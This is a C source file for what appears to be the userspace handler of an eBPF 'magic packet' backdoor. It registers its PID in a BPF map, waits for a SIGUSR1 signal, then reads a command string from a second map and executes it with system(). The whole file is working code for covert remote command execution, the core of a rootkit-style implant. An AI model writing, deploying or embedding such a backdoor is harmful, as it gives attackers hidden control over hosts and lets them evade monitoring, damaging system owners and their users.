#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>

#define CMD_MAX 64
#define BPF_ATTR_SZ(f) \
    (offsetof(union bpf_attr, f) + sizeof(((union bpf_attr *)0)->f))

struct trigger_entry {
    uint8_t  cmd[CMD_MAX];
    uint32_t len;
    uint32_t ready;
};

static int bpf_call(int cmd, union bpf_attr *a, unsigned sz)
{ return (int)syscall(__NR_bpf, cmd, a, sz); }

static int map_fd_by_id(uint32_t id)
{ union bpf_attr a = {}; a.map_id = id;
  return bpf_call(BPF_MAP_GET_FD_BY_ID, &a, BPF_ATTR_SZ(map_id)); }

static int map_lookup(int fd, const void *key, void *val)
{ union bpf_attr a = {}; a.map_fd=(uint32_t)fd;
  a.key=(uint64_t)(uintptr_t)key; a.value=(uint64_t)(uintptr_t)val;
  return bpf_call(BPF_MAP_LOOKUP_ELEM, &a, BPF_ATTR_SZ(value)); }

static int map_update(int fd, const void *key, const void *val)
{ union bpf_attr a = {}; a.map_fd=(uint32_t)fd;
  a.key=(uint64_t)(uintptr_t)key; a.value=(uint64_t)(uintptr_t)val; a.flags=BPF_ANY;
  return bpf_call(BPF_MAP_UPDATE_ELEM, &a, BPF_ATTR_SZ(flags)); }

static int g_trigger_fd  = -1;
static int g_handler_pid_fd = -1;
static volatile sig_atomic_t g_fired = 0;

static void sighandler(int sig)
{
    (void)sig;
    g_fired = 1;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <trigger_map_id> <handler_pid_map_id>\n", argv[0]);
        return 1;
    }

    g_trigger_fd     = map_fd_by_id((uint32_t)atoi(argv[1]));
    g_handler_pid_fd = map_fd_by_id((uint32_t)atoi(argv[2]));
    if (g_trigger_fd < 0 || g_handler_pid_fd < 0) {
        perror("map_fd"); return 1;
    }

    uint32_t key = 0;
    uint32_t pid = (uint32_t)getpid();
    if (map_update(g_handler_pid_fd, &key, &pid) < 0) {
        perror("register pid"); return 1;
    }
    printf("[*] registered handler PID=%u\n", pid);
    printf("[*] waiting for magic packets (SIGUSR1)...\n");

    signal(SIGUSR1, sighandler);

    for (;;) {
        pause();
        if (!g_fired) continue;
        g_fired = 0;

        struct trigger_entry t = {};
        if (map_lookup(g_trigger_fd, &key, &t) < 0) continue;
        if (!t.ready) continue;

        t.cmd[CMD_MAX - 1] = '\0';
        printf("[*] executing: %s\n", (char *)t.cmd);
        fflush(stdout);
        system((char *)t.cmd);

        t.ready = 0;
        map_update(g_trigger_fd, &key, &t);
    }

    return 0;
}
